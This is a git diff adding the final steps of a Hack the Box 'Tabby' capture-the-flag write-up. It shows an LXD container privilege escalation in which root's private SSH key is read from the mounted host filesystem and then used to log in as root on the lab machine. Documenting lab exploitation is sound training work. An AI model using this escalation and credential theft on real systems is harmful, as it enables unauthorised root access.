@@ -277,3 +277,26 @@ lxc start mycontainer
 ```
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/83afa919-e4ad-43ac-b2f2-e2fd54534c69)
 
+Access the container.
+```CSS
+ash@tabby:~$ lxc exec mycontainer /bin/sh
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/7bf7d9cc-2a38-41f3-852b-c894d4e67c3f)
+
+Found Root SSH Key
+```CSS
+cd /mnt/root/root/.ssh
+/mnt/root/root/.ssh # cat id_rsa
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/84d66806-db7b-40b1-9dbb-4db934da4857)
+
+Copy the Key and assign appropriate permissions.
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f632216a-a564-40f7-9eda-21d662e339a6)
+
+SSH as Root
+```CSS
+▶ ssh -i id_rsa root@10.10.10.194
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/cfdacd7c-2ec8-4806-ad8d-fbb260248b89)
+
+---
